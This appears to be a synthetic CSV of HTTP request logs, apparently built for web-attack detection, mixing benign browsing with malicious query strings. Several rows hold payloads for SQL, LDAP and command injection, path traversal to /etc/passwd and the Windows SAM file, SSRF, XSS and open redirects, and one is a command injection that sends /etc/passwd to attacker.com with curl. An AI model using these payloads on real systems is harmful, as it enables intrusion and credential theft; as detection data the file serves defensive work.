source_ip,timestamp,full_url,method,host,path,query_string,fragment,status_code,user_agent,referrer,source
10.0.0.126,2026-04-07T07:48:25.305537,https://10.0.0.50/search?cn=admin%29%28%26%29,GET,10.0.0.50,/search,cn=admin%29%28%26%29,,,burpsuite,,pcap
10.0.0.40,2026-04-07T07:48:25.307040,http://webapp.internal/privacy,HEAD,webapp.internal,/privacy,,,,python-requests/2.31.0,,pcap
172.16.0.203,2026-04-07T07:48:25.307040,http://api.example.com/faq,GET,api.example.com,/faq,,,,curl/8.4.0,,pcap
10.0.0.17,2026-04-07T07:48:25.307040,http://example.com/read?doc=php://filter/convert.base64-encode/resource=index.php,GET,example.com,/read,doc=php://filter/convert.base64-encode/resource=index.php,,,masscan/1.3,,pcap
192.168.1.168,2026-04-07T07:48:25.308022,http://10.0.0.50/api/products?brand=apple,POST,10.0.0.50,/api/products,brand=apple,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
172.16.0.200,2026-04-07T07:48:25.308022,http://api.example.com/products?user=',POST,api.example.com,/products,user=',,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.70,2026-04-07T07:48:25.308022,http://test-app.local/notifications?lang=en&page=1,GET,test-app.local,/notifications,lang=en&page=1,,,PostmanRuntime/7.35.0,,pcap
172.16.0.87,2026-04-07T07:48:25.309003,https://example.com/index.html,GET,example.com,/index.html,,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
172.16.0.114,2026-04-07T07:48:25.309003,https://api.example.com/load?target=http%3A%2F%2Flocaltest.me%2F,GET,api.example.com,/load,target=http%3A%2F%2Flocaltest.me%2F,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.62,2026-04-07T07:48:25.309981,https://webapp.internal/lookup?ip=test&,GET,webapp.internal,/lookup,ip=test&,,,python-requests/2.31.0,,pcap
192.168.1.96,2026-04-07T07:48:25.309981,http://api.example.com/news,HEAD,api.example.com,/news,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.154,2026-04-07T07:48:25.309981,http://10.0.0.50/api/products?limit=10&sort=asc&from=2024-01-01,GET,10.0.0.50,/api/products,limit=10&sort=asc&from=2024-01-01,,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
10.0.0.63,2026-04-07T07:48:25.310956,http://secure.example.com/help,GET,secure.example.com,/help,,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
172.16.0.186,2026-04-07T07:48:25.310956,https://secure.example.com/tools?run=test%3B%20curl%20http%3A%2F%2Fattacker.com%2Fexfil%3Fdata%3D%24%28cat%20%2Fetc%2Fpasswd%29,POST,secure.example.com,/tools,run=test%3B%20curl%20http%3A%2F%2Fattacker.com%2Fexfil%3Fdata%3D%24%28cat%20%2Fetc%2Fpasswd%29,,,sqlmap/1.7.12#dev,,pcap
172.16.0.187,2026-04-07T07:48:25.310956,https://secure.example.com/search?id=%27%20OR%20%27x%27%3D%27x,GET,secure.example.com,/search,id=%27%20OR%20%27x%27%3D%27x,,,nuclei,,pcap
10.0.0.139,2026-04-07T07:48:25.310956,https://10.0.0.50/ping?ip=test;,POST,10.0.0.50,/ping,ip=test;,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.247,2026-04-07T07:48:25.311934,http://example.com/lookup?cmd=test;,POST,example.com,/lookup,cmd=test;,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
172.16.0.25,2026-04-07T07:48:25.311934,http://test-app.local/api/message?name=<input,GET,test-app.local,/api/message,name=<input,,,masscan/1.3,,pcap
192.168.1.85,2026-04-07T07:48:25.311934,http://shop.example.com/tools?exec=test$(cat,GET,shop.example.com,/tools,exec=test$(cat,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.196,2026-04-07T07:48:25.312937,http://webapp.internal/api/execute?target=test$(sleep,POST,webapp.internal,/api/execute,target=test$(sleep,,,python-requests/2.31.0,,pcap
10.0.0.168,2026-04-07T07:48:25.312937,https://example.com/url?target=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,GET,example.com,/url,target=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,,,gobuster/3.6,,pcap
172.16.0.69,2026-04-07T07:48:25.312937,http://admin.example.com/include?page=C:\Windows\System32\drivers\etc\hosts,GET,admin.example.com,/include,page=C:\Windows\System32\drivers\etc\hosts,,,masscan/1.3,,pcap
10.0.0.127,2026-04-07T07:48:25.313923,https://secure.example.com/comment?query=%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E,POST,secure.example.com,/comment,query=%3Cimg%20src%3D1%20onerror%3Dalert%281%29%3E,,,wfuzz/3.1.0,,pcap
192.168.1.81,2026-04-07T07:48:25.313923,http://webapp.internal/news,GET,webapp.internal,/news,,,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,,pcap
10.0.0.111,2026-04-07T07:48:25.313923,http://secure.example.com/checkout?q=laptop,GET,secure.example.com,/checkout,q=laptop,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.58,2026-04-07T07:48:25.314897,http://192.168.1.100/notifications?format=json,HEAD,192.168.1.100,/notifications,format=json,,,PostmanRuntime/7.35.0,,pcap
10.0.0.221,2026-04-07T07:48:25.314897,http://test-app.local/notifications,GET,test-app.local,/notifications,,,,python-requests/2.31.0,,pcap
10.0.0.202,2026-04-07T07:48:25.314897,https://admin.example.com/redirect?url=https%3A%2F%2Fevil.com,GET,admin.example.com,/redirect,url=https%3A%2F%2Fevil.com,,,burpsuite,,pcap
172.16.0.186,2026-04-07T07:48:25.315874,http://test-app.local/events?status=active&q=laptop&user=john,GET,test-app.local,/events,status=active&q=laptop&user=john,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
192.168.1.37,2026-04-07T07:48:25.315874,http://192.168.1.100/fetch?fetch=http%3A%2F%2F0x7f000001%2F,GET,192.168.1.100,/fetch,fetch=http%3A%2F%2F0x7f000001%2F,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.94,2026-04-07T07:48:25.315874,http://test-app.local/api/fetch?fetch=http%3A%2F%2Flocaltest.me%2F,GET,test-app.local,/api/fetch,fetch=http%3A%2F%2Flocaltest.me%2F,,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
172.16.0.254,2026-04-07T07:48:25.316880,http://example.com/index.html?page=1&lang=en&sort=asc,GET,example.com,/index.html,page=1&lang=en&sort=asc,,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
10.0.0.118,2026-04-07T07:48:25.316880,https://shop.example.com/notifications,GET,shop.example.com,/notifications,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
10.0.0.8,2026-04-07T07:48:25.316880,https://secure.example.com/css/style.css,POST,secure.example.com,/css/style.css,,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.214,2026-04-07T07:48:25.316880,http://secure.example.com/return?next=%2F%2Fevil.com%2Fpath,GET,secure.example.com,/return,next=%2F%2Fevil.com%2Fpath,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
10.0.0.163,2026-04-07T07:48:25.318840,http://10.0.0.50/download/file:///etc/passwd,GET,10.0.0.50,/download/file:///etc/passwd,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.223,2026-04-07T07:48:25.318840,http://secure.example.com/privacy,GET,secure.example.com,/privacy,,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.2,2026-04-07T07:48:25.319817,http://example.com/api/execute?target=test|,GET,example.com,/api/execute,target=test|,,,sqlmap/1.7.12#dev,,pcap
192.168.1.192,2026-04-07T07:48:25.319817,https://192.168.1.100/directory?uid=admin%2A,GET,192.168.1.100,/directory,uid=admin%2A,,,burpsuite,,pcap
172.16.0.91,2026-04-07T07:48:25.319817,http://10.0.0.50/about,GET,10.0.0.50,/about,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.72,2026-04-07T07:48:25.320792,http://example.com/faq,GET,example.com,/faq,,,,curl/8.4.0,,pcap
192.168.1.32,2026-04-07T07:48:25.320792,https://10.0.0.50/api/v2/data,GET,10.0.0.50,/api/v2/data,,,,curl/8.4.0,,pcap
172.16.0.197,2026-04-07T07:48:25.320792,http://admin.example.com/products,POST,admin.example.com,/products,,,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
172.16.0.225,2026-04-07T07:48:25.321769,https://secure.example.com/return?goto=%2F%2Fgoogle.com%252f%40evil.com,GET,secure.example.com,/return,goto=%2F%2Fgoogle.com%252f%40evil.com,,,gobuster/3.6,,pcap
192.168.1.196,2026-04-07T07:48:25.321769,http://10.0.0.50/faq?filter=recent,POST,10.0.0.50,/faq,filter=recent,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
192.168.1.109,2026-04-07T07:48:25.321769,https://admin.example.com/products?type=product&order=name,GET,admin.example.com,/products,type=product&order=name,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.252,2026-04-07T07:48:25.321769,http://secure.example.com/help?lang=en&user=john&category=electronics,HEAD,secure.example.com,/help,lang=en&user=john&category=electronics,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.58,2026-04-07T07:48:25.321769,https://example.com/return?redirect=http%3A%2F%2Fevil.com,GET,example.com,/return,redirect=http%3A%2F%2Fevil.com,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
172.16.0.211,2026-04-07T07:48:25.323276,https://example.com/notifications?type=product,POST,example.com,/notifications,type=product,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
172.16.0.25,2026-04-07T07:48:25.323276,https://example.com/products,GET,example.com,/products,,,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
192.168.1.136,2026-04-07T07:48:25.324262,http://192.168.1.100/,GET,192.168.1.100,/,,,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",,pcap
172.16.0.79,2026-04-07T07:48:25.324262,http://10.0.0.50/api/v1/status?id=123,HEAD,10.0.0.50,/api/v1/status,id=123,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
192.168.1.214,2026-04-07T07:48:25.324262,http://webapp.internal/load?src=http%3A%2F%2F127.1%2F,GET,webapp.internal,/load,src=http%3A%2F%2F127.1%2F,,,python-requests/2.31.0,,pcap
172.16.0.132,2026-04-07T07:48:25.325238,http://admin.example.com/cart,GET,admin.example.com,/cart,,,,"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",,pcap
192.168.1.16,2026-04-07T07:48:25.325238,http://192.168.1.100/redirect?goto=%2F%2Fgoogle.com%252f%40evil.com,GET,192.168.1.100,/redirect,goto=%2F%2Fgoogle.com%252f%40evil.com,,,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,pcap
172.16.0.104,2026-04-07T07:48:25.325238,http://10.0.0.50/url?return=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,GET,10.0.0.50,/url,return=%2Fredirect%3Furl%3Dhttp%3A%2F%2Fevil.com,,,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",,pcap
10.0.0.51,2026-04-07T07:48:25.326214,https://10.0.0.50/download?template=..\..\..\windows\system32\config\sam,GET,10.0.0.50,/download,template=..\..\..\windows\system32\config\sam,,,masscan/1.3,,pcap
10.0.0.237,2026-04-07T07:48:25.326214,http://test-app.local/images/logo.png?brand=apple&type=product,POST,test-app.local,/images/logo.png,brand=apple&type=product,,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,pcap
192.168.1.170,2026-04-07T07:48:25.326214,http://api.example.com/index.html?q=laptop&lang=en,GET,api.example.com,/index.html,q=laptop&lang=en,,,PostmanRuntime/7.35.0,,pcap
